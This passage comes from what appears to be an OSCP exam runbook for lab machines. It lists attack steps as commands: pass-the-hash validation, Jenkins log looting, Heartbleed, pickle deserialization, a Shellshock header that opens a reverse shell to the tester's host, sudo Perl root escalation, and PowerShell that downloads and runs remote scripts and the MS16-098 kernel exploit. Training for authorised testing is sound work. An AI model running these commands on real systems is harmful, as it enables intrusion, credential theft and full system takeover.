- [ ] Cleartext LDAP bind arrives -> **Open [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]] and test the account against the named service.**
- [ ] Nothing arrives -> **Confirm the target can reach the listener and that the application accepted the controlled callback address.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - LDAP Passback|AD LDAP Passback]] or the NTLM capture stage, then stop the listener after the test.

## T41 - SMB, WinRM, SSH, and pass-the-hash validation

### Run this

~~~bash
netexec smb "$BoxIP" -u "$Username" -p "$Password" -d "$Domain"
netexec winrm "$BoxIP" -u "$Username" -p "$Password" -d "$Domain"
netexec smb "$BoxIP" -u "$Username" -H "$NThash" -d "$Domain"
~~~

### What did you get?

- [ ] SMB accepts the credential -> **Enumerate shares and use the least-privileged next branch.**
- [ ] WinRM accepts it -> **Open [[#T22 - Callback and shell stabilization|T22]] or the Windows fast path.**
- [ ] Hash authentication succeeds -> **Use the matching pass-the-hash shell and open [[#T33 - Windows credential artifacts, LSASS, Winlogon, and Credential Manager|T33]] or [[#T39 - NTDS, VSS, Backup Operators, and DCSync|T39]].**
- [ ] Authentication fails -> **Recheck account format, domain, host, protocol, and clock. Do not spray.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - Credential Validation|AD Credential Validation]] or the platform-specific SSH or WinRM stage.

## T42 - Jenkins, Groovy, and build-log credential recovery

### Run this

~~~bash
curl -sS -i "$WebURL/" | tee "$BoxDir/loot/jenkins-headers.txt"
curl -sS -u "$Username:$Password" "$WebURL/$LogPath" -o "$BoxDir/loot/build-log.txt"
grep -Ein 'password|secret|token|credential|ssh' "$BoxDir/loot/build-log.txt"
~~~

### What did you get?

- [ ] Script console or build log is accessible -> **Run only the identity proof or save the credential-bearing log, then open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T22 - Callback and shell stabilization|T22]].**
- [ ] Credential is found in logs or configuration -> **Open [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] Jenkins is present but not authenticated -> **Return to [[#T06 - Web fingerprint and content discovery|T06]] and identify the exact access condition.**

### Open next

Use the Jenkins Script Console and credential-search stages, then preserve the original log and clean any temporary job or file.

## T43 - SMTP, OpenSMTPD, and service-specific RCE

### Run this

~~~bash
nc "$BoxIP" "$SmtpPort"
searchsploit "$Product $Version"
python3 "$ExploitFile" "$BoxIP" "$SmtpPort"
~~~

### What did you get?

- [ ] Service version and PoC conditions match -> **Open [[#T22 - Callback and shell stabilization|T22]] and catch the callback.**
- [ ] Banner differs or exploit crashes -> **Return to [[#T07 - Version-specific web exploit|T07]] and adapt only after reviewing the protocol and version.**
- [ ] SMTP exposes users or mailboxes but no RCE -> **Open [[#T10 - Mail service default credentials and mailbox pivot|T10]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Exploit Search|Linux Exploit Search]] and [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux RCE to Shell]].

## T44 - IoT, Pi-hole, SNMP process, and default credentials

### Run this

~~~bash
curl -sS -i "$WebURL/" | tee "$BoxDir/loot/iot-headers.txt"
curl -sS -i "$WebURL/admin/" | tee "$BoxDir/loot/iot-admin.txt"
snmpwalk -v2c -c "$Community" "$BoxIP" | tee "$BoxDir/loot/snmp.txt"
~~~

### What did you get?

- [ ] Product and version are disclosed -> **Check documented default credentials before exploit work.**
- [ ] Factory credential works over SSH or the panel -> **Open [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]], then run [[#T25 - Linux sudo interpreter and editor abuse|T25]].**
- [ ] SNMP exposes a process, path, or startup option -> **Open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T43 - SMTP, OpenSMTPD, and service-specific RCE|T43]].**
- [ ] USB, backup, or mounted-media clue appears -> **Preserve it as forensic evidence and inspect offline.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - IoT Default Credentials|Linux IoT Default Credentials]] and the Linux fast path.

## T45 - Password cracking and mechanical decoding

### Run this

~~~bash
john --wordlist="$Wordlist" "$HashFile"
hashcat -m "$HashMode" "$HashFile" "$Wordlist" --potfile-path "$BoxDir/loot/hashcat.potfile"
printf '%s' "$EncodedValue" | base64 -d | base64 -d
~~~

### What did you get?

- [ ] Recovered value is produced -> **Store it privately and validate once with [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] or [[#T41 - SMB, WinRM, SSH, and pass-the-hash validation|T41]].**
- [ ] No result -> **Confirm hash mode, encoding layers, wordlist, and source artifact before trying another route.**
- [ ] Value is a key passphrase -> **Open [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] and preserve the encrypted key.**

### Open next

Use [[OSCP/MODERN TOOLING/John the Ripper|John the Ripper]], [[OSCP/RUNBOOK V2/AD - Kerberoasting|AD Kerberoasting]], or the relevant credential-search page.

## T46 - Stored XSS and administrator-bot workflow

### Run this

~~~bash
curl -sS -X POST "$WebURL/$ContactPath" --data-urlencode "$MessageField=$HarmlessMarker" | tee "$BoxDir/loot/xss-submit.txt"
curl -sS "$WebURL/$AdminPath" | tee "$BoxDir/loot/admin-response.txt"
~~~

### What did you get?

- [ ] Marker is stored and the administrator workflow reads it -> **Open [[#T17 - File upload and webshell|T17]] or [[#T16 - SSRF to an internal service|T16]] for the resulting browser action.**
- [ ] Bot does not visit or output is filtered -> **Confirm the field, encoding, and review timing before changing payloads.**
- [ ] Browser action reaches an upload or credential flow -> **Open [[#T17 - File upload and webshell|T17]] or [[#T18 - Source, configuration, backup, and log credential recovery|T18]].**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Stored XSS|Linux Stored XSS]] and keep the test marker harmless until the request path is proven.

## T47 - TLS memory disclosure and Heartbleed

### Run this

~~~bash
sudo nmap -Pn -p "$TLSPort" --script ssl-heartbleed "$BoxIP" -oN "$BoxDir/loot/heartbleed-nmap.txt"
~~~

### What did you get?

- [ ] The service is vulnerable -> **Collect only the required memory evidence, inspect it for a key, passphrase, cookie, or credential, then open [[#T45 - Password cracking and mechanical decoding|T45]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]].**
- [ ] The service is not vulnerable -> **Return to [[#T06 - Web fingerprint and content discovery|T06]] or continue with the confirmed SSH and web branches.**
- [ ] TLS negotiation fails -> **Confirm the port, protocol, and legacy cipher requirements before changing the exploit path.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Heartbleed|Linux Heartbleed]] and [[OSCP/DECISION TREE/TLS Memory Disclosure and Tmux (Decision Tree)|TLS Memory Disclosure decision tree]]. Keep captured memory private.

## T48 - Unsafe deserialization and Python pickle

### Run this

~~~bash
grep -RniE 'pickle\.loads|yaml\.load|marshal\.loads' "$BoxDir/loot/source" 2>/dev/null
python3 "$PickleProof" "$WebURL/$Path" | tee "$BoxDir/loot/deserialization-test.txt"
~~~

### What did you get?

- [ ] A harmless proof payload executes -> **Adapt the reviewed payload for [[#T22 - Callback and shell stabilization|T22]] and keep the source and request together.**
- [ ] Deserialization is present but blocked -> **Confirm the content type, object format, and endpoint before changing the payload.**
- [ ] The same source exposes an SSH key or credential -> **Open [[#T18 - Source, configuration, backup, and log credential recovery|T18]] or [[#T23 - SSH credentials, keys, passphrases, and password reuse|T23]] instead of forcing code execution.**

### Open next

Use [[OSCP/RUNBOOK V2/Linux - Python Pickle|Linux Python Pickle]] and return to [[#T22 - Callback and shell stabilization|T22]] after command execution is proven.

## T50 - Client certificate and PowerShell Web Access

### Run this

~~~bash
pfx2john "$BoxDir/loot/staff.pfx" > "$BoxDir/loot/staff.pfx.hash"
john "$BoxDir/loot/staff.pfx.hash" --wordlist="$Wordlist"
curl -skL "https://$Domain/staff" --cert-type P12 \
  --cert "$BoxDir/loot/staff.pfx:$PfxPass" \
  -c "$BoxDir/loot/cookies.txt" -b "$BoxDir/loot/cookies.txt" \
  -o "$BoxDir/loot/staff-logon.html"
firefox "https://$Domain/staff" &
~~~

### What did you get?

- [ ] PFX cracks and identifies a domain user -> **Use the client certificate with the expected hostname and preserve the redirect chain.**
- [ ] /staff reaches logon.aspx -> **Complete the stateful form in a browser, selecting computer-name and the target node.**
- [ ] PowerShell opens -> **Run identity and group triage, then open [[#T37 - gMSA password read|T37]] or [[#T36 - AD ACL, group membership, and ForceChangePassword|T36]].**
- [ ] Curl reports a PEM error or no useful status -> **Add --cert-type P12, use the domain name, and check local name resolution.**

### Open next

Use [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD PowerShell Web Access]] and preserve the form, cookies, target node, and shell identity.

## T51 - Apache CGI Shellshock and passwordless Perl

### Run this

~~~bash
curl -si "http://$BoxIP:$WebPort/cgi-bin/"

gobuster dir -u "http://$BoxIP:$WebPort/cgi-bin/" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,cgi,pl,py -o "$BoxDir/loot/gobuster-cgi.txt"

curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id'

nc -lvnp "$Lport"

curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"

sudo -n -l

sudo /usr/bin/perl -e 'exec "/bin/bash";'

id
~~~

### What did you get?

- [ ] The direct CGI file returns a uid line -> **Save the harmless proof, then send the callback through the same header.**
- [ ] The listener receives a shell -> **Run id, whoami, and hostname, stabilise the terminal, and open [[#T22 - Callback and shell stabilization|T22]].**
- [ ] Sudo allows the exact Perl path without a password -> **Use Perl inline execution, prove UID 0, and open [[#T49 - Cleanup and closeout after a scenario branch|T49]].**
- [ ] The HTTP request times out after callback delivery -> **Check the listener; the CGI process may be attached to the shell.**
- [ ] The identity proof fails -> **Return to [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux Shellshock CGI]] and confirm the script, header, and interpreter.**

### Open next

Use [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]], [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux Shellshock CGI]], and [[#T49 - Cleanup and closeout after a scenario branch|T49]].

## T52 - Windows patch triage and MS16-098

### Run this

~~~powershell
systeminfo
IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')
Find-AllVulns
~~~

Stage the reviewed binary from Kali, then fetch it from the native Windows callback:

~~~bash
curl -fL https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-098/bfill.exe \
  -o "$BoxDir/www/bfill.exe"
~~~

~~~powershell
(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\Public\bfill.exe')
C:\Users\Public\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\Public\system-shell.ps1
whoami
hostname
~~~

### What did you get?

- [ ] `systeminfo` shows one processor and Sherlock suggests MS16-032 -> **Reject that implementation because its CPU check fails on a single-processor host. Compare another candidate against the exact OS, architecture, build, and patch state.**
- [ ] MS16-098 matches the host and the binary is downloaded -> **Run it from the clean native callback with a fresh listener, not from the HFS worker context.**
- [ ] `whoami` returns SYSTEM -> **Capture the identity and hostname privately, then open [[#T49 - Cleanup and closeout after a scenario branch|T49]].**
- [ ] No callback -> **Check the transfer log, callback port, PowerShell script, listener, and execution context before changing exploit families.**

### Open next

Use [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows Privilege Triage]], [[OSCP/COMMAND APPENDIX/Windows Privilege Escalation|Windows Privilege Escalation]], and [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].

## T49 - Cleanup and closeout after a scenario branch

### Run this

~~~bash
ssh "$Username@$BoxIP" "rm -f '$RemoteArtifact'"
boxdone
htblog
~~~

For Windows or AD, reverse the exact service, task, upload, account, group, RBCD, or ACL change recorded in the timeline before running boxdone.

### What did you get?

- [ ] Target changes are reversed and proof is private -> **Open [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]].**
- [ ] A change remains or cleanup fails -> **Stop, preserve the workspace, and use the matching RUNBOOK V2 clean-down page.**

### Open next

Update the relevant exam branch, this matrix row, and the write-up with the decisive output clue and any tool gotcha.

## Related pages

- [[OSCP/EXAM RUNBOOK/01 - Recon and Triage|Recon and Triage]]
- [[OSCP/EXAM RUNBOOK/02 - Web and Services|Web and Services]]
- [[OSCP/EXAM RUNBOOK/03 - Linux Fast Path|Linux Fast Path]]
- [[OSCP/EXAM RUNBOOK/04 - Windows Fast Path|Windows Fast Path]]
- [[OSCP/EXAM RUNBOOK/05 - Active Directory Fast Path|Active Directory Fast Path]]
- [[OSCP/EXAM RUNBOOK/07 - Branch Matrix|Branch Matrix]]
- [[OSCP/EXAM RUNBOOK/08 - Evidence and Clean Down|Evidence and Clean Down]]
